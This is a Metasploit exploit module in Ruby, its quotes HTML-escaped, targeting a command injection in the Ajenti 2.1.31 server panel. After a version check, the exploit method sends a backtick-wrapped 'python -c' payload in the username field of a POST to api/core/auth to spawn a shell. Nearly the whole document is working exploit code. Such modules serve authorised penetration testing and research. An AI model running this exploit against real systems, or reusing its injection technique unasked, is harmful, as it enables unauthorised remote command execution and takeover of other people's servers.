# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;Ajenti auth username Command Injection&#039;,
      &#039;Description&#039;     => %q{
        This module exploits a command injection in Ajenti == 2.1.31.
        By injecting a command into the username POST parameter to api/core/auth, a shell can be spawned.
      },
      &#039;Author&#039;          => [
        &#039;Jeremy Brown&#039;, # Vulnerability discovery
        &#039;Onur ER <onur@onurer.net>&#039; # Metasploit module
      ],
      &#039;References&#039;      => [
        [&#039;EDB&#039;, &#039;47497&#039;]
      ],
      &#039;DisclosureDate&#039;  => &#039;2019-10-14&#039;,
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Platform&#039;        => &#039;python&#039;,
      &#039;Arch&#039;            => ARCH_PYTHON,
      &#039;Privileged&#039;      => false,
      &#039;Targets&#039;         => [
        [&#039;Ajenti == 2.1.31&#039;, {}]
      ],
      &#039;DefaultOptions&#039;  =>
          {
            &#039;RPORT&#039;   => 8000,
            &#039;SSL&#039;     => true,
          },
      &#039;DefaultTarget&#039;   => 0
    ))
    register_options([
      OptString.new(&#039;TARGETURI&#039;, [true, &#039;Base path&#039;, &#039;/&#039;])
    ])
  end

  def check
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039;    => &#039;/view/login/normal&#039;
    })

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    unless res.body =~ /ajenti/i
      return CheckCode::Safe
    end

    version = res.body.scan(/&#039;ajentiVersion&#039;, &#039;([\d\.]+)&#039;/).flatten.first

    if version
      vprint_status "Ajenti version #{version}"
    end

    if version == &#039;2.1.31&#039;
      return CheckCode::Appears
    end

    CheckCode::Detected
  end

  def exploit
    print_status(&#039;Exploiting...&#039;)
    json_body = { &#039;username&#039; => "`python -c \"#{payload.encoded}\"`",
                  &#039;password&#039; => rand_text_alpha_lower(7),
                  &#039;mode&#039; => &#039;normal&#039;
    }
    send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => normalize_uri(target_uri, &#039;api&#039;, &#039;core&#039;, &#039;auth&#039;),
      &#039;ctype&#039;  => &#039;application/json&#039;,
      &#039;data&#039;   => JSON.generate(json_body)
    })
  end
end

